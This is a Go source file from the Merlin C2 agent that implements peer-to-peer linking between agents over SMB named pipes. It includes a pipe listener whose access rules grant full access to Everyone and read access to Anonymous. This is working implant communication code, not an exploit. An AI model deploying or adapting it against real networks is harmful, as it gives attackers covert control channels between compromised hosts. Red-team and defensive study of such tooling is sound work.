//go:build windows

// This smb.go file is part of the "link" command and is not a standalone command

package commands

import (
	// Standard
	"bufio"
	"bytes"
	"encoding/gob"
	"fmt"
	"net"
	"time"
	"unsafe"

	// X Packages
	"golang.org/x/sys/windows"

	// 3rd Party
	"github.com/Ne0nd0g/npipe"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/jobs"
	"github.com/Ne0nd0g/merlin/pkg/messages"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/cli"
	"github.com/Ne0nd0g/merlin-agent/p2p"
)

// ConnectSMB establishes an SMB connection over a named pipe to a smb-bind peer-to-peer Agent
func ConnectSMB(host, pipe string) (results jobs.Results) {
	cli.Message(cli.DEBUG, fmt.Sprintf("commands/smb.ConnectSMB(): entering into function with network: %s, pipe: %s", host, pipe))

	// Validate incoming arguments
	// The period is used to signify "this host"
	if host != "." {
		_, err := net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:445", host))
		if err != nil {
			results.Stderr = fmt.Sprintf("commands.smb.ConnectSMB(): there was an error validating the input network address: %s", err)
			return
		}
	}

	address := fmt.Sprintf("\\\\%s\\pipe\\%s", host, pipe)

	linkedAgent := p2p.Agent{
		In:  make(chan messages.Base, 100),
		Out: make(chan messages.Base, 100),
	}

	linkedAgent.Type = p2p.SMBBIND

	// Establish connection to downstream agent
	conn, err := npipe.Dial(address)
	if err != nil {
		results.Stderr = fmt.Sprintf("commands/smb.ConnectSMB(): there was an error attempting to link the agent: %s", err.Error())
		return
	}

	linkedAgent.Conn = conn
	linkedAgent.Remote = conn.RemoteAddr()

	// Need to read data here in this function to retrieve the linked Agent's ID so the linkedAgent structure can be stored
	var n int
	data := make([]byte, 50000)
	n, err = bufio.NewReader(linkedAgent.Conn.(net.Conn)).Read(data)
	if err != nil {
		msg := fmt.Sprintf("there was an error reading data from linked agent %s: %s", address, err)
		results.Stderr = msg
		cli.Message(cli.WARN, msg)
		return
	}
	cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from linked %s agent %s at %s", n, &linkedAgent, address, time.Now().UTC().Format(time.RFC3339)))

	// Decode GOB from server response into Base
	var msg messages.Delegate
	reader := bytes.NewReader(data)

	//fmt.Printf("DATA: %s\n", data)
	errD := gob.NewDecoder(reader).Decode(&msg)
	if errD != nil {
		err = fmt.Errorf("there was an error decoding the gob message:\r\n%s", errD.Error())
		return
	}

	// Store LinkedAgent
	p2p.LinkedAgents.Store(msg.Agent, linkedAgent)

	p2p.AddDelegateMessage(msg)

	results.Stdout = fmt.Sprintf("Successfully connected to %s at %s", msg.Agent, address)

	// The listen function is in commands/listen.go
	go listen(linkedAgent.Conn.(net.Conn))
	return
}

// ListenSMB binds to the provided named pipe and listens for incoming SMB connections
func ListenSMB(pipe string) error {
	cli.Message(cli.DEBUG, fmt.Sprintf("commands/smb.ListenSMB(): entering into function with pipe: %s", pipe))
	addr := fmt.Sprintf("\\\\.\\pipe\\%s", pipe)

	// Create the security descriptor
	// D = Discretionary Access List (DACL)
	// A = Allow
	// FA = FILE_ALL_ACCESS, FR = FILE_GENERIC_READ
	// https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings
	// SY = SYSTEM, BA = BUILT-IN ADMINISTRATORS, CO = CREATOR OWNER, WD = EVERYONE, AN = ANONYMOUS
	// https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings
	// Leave the Owner "O:" off, and it will be set to the user that created the named pipe by default
	// Leave the Group "G:" off, and it will be set to the "None" group by default
	sddl := "D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;CO)(A;;FA;;;WD)(A;;FR;;;AN)"

	var sd *windows.SECURITY_DESCRIPTOR
	var err error
	sd, err = windows.SecurityDescriptorFromString(sddl)
	if err != nil {
		return fmt.Errorf("commands/smb.ListenSMB(): there was an error converting the SDDL string \"%s\" to a SECURITY_DESCRIPTOR: %s", sddl, err)
	}

	// Create the Security Attributes
	// https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)
	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(sd)),
		SecurityDescriptor: sd,
		InheritHandle:      1,
	}

	mode := windows.PIPE_ACCESS_DUPLEX | windows.FILE_FLAG_OVERLAPPED | windows.FILE_FLAG_FIRST_PIPE_INSTANCE
	listener, err := npipe.NewPipeListener(addr, uint32(mode), windows.PIPE_TYPE_BYTE, windows.PIPE_UNLIMITED_INSTANCES, 512, 512, 0, &sa)
	if err != nil {
		// Try again without FILE_FLAG_FIRST_PIPE_INSTANCE
		mode = windows.PIPE_ACCESS_DUPLEX | windows.FILE_FLAG_OVERLAPPED
		listener, err = npipe.NewPipeListener(addr, uint32(mode), windows.PIPE_TYPE_BYTE, windows.PIPE_UNLIMITED_INSTANCES, 512, 512, 0, &sa)
		if err != nil {
			return fmt.Errorf("clients/smb.Connect(): there was an error listening on %s: %s", addr, err)
		}
	}

	// Add to global listeners
	var ok bool
	var l p2pListener
	for _, l = range p2pListeners {
		if l.Type == SMB {
			// Check to see if there is already a p2pListener in the map for this address
			if listener.Addr() == l.Listener.(net.Listener).Addr() {
				ok = true
				break
			}
		}
	}

	if !ok {
		l = p2pListener{
			Addr:     listener.Addr().String(),
			Listener: listener,
			Type:     SMB,
		}
		p2pListeners = append(p2pListeners, l)
	}

	cli.Message(cli.NOTE, fmt.Sprintf("Started SMB listener on %s and waiting for a connection...", addr))

	// Listen for initial connection from upstream agent
	go accept(listener)
	return nil
}
